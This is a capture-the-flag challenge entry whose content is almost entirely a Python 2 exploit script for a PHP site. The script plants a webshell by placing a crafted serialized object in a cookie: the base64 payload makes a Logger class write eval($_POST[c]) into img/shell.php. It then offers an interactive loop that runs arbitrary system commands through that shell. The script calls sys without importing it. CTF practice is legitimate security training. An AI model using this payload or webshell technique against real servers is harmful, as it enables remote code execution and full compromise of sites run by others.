#### Goals
 * RCE and try to find the flag

#### Server Address
 * http://web.sniperoj.com:10011/

#### Solution
```python
#!/usr/bin/env python

import requests

if len(sys.argv) != 3:
    print "Usage: "
    print "\tpython %s [HOST] [PORT]" % (sys.argv[0])
    exit(1)

host = sys.argv[1]
port = int(sys.argv[2])

url = "http://%s:%d/" % (host, port)

print "[+] Writing shell to target site..."
webshell = "%simg/shell.php" % (url)

session = requests.Session()

cookies = {
    "drawing":"Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoyNzoiL3Zhci93d3cvaHRtbC9pbWcvc2hlbGwucGhwIjtzOjE1OiIATG9nZ2VyAGluaXRNc2ciO3M6MjQ6Ijw/cGhwIGV2YWwoJF9QT1NUW2NdKTs/PiI7czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjI0OiI8P3BocCBldmFsKCRfUE9TVFtjXSk7Pz4iO30=",
}

response = session.get(url, cookies=cookies)

if response.status_code == 500: # ??? Why 500 ???
    print "[+] Web shell uploaded!"
else:
    print "[-] Failed!"
    exit(1)

print "[+] Entering Interactive mode..."

while True:
    command = raw_input("[+] Please input your command : ")
    if command.lower() == "exit":
        break
    data = {
        'c':"system('%s');" % (command),
    }
    response = requests.post(webshell, data = data)
    print "[+] Ok! Result : "
    print response.content
```

#### Writeups
 * TODO

## 版权

该题目复现环境尚未取得主办方及出题人相关授权，如果侵权，请联系本人删除（wangyihanger@gmail.com）
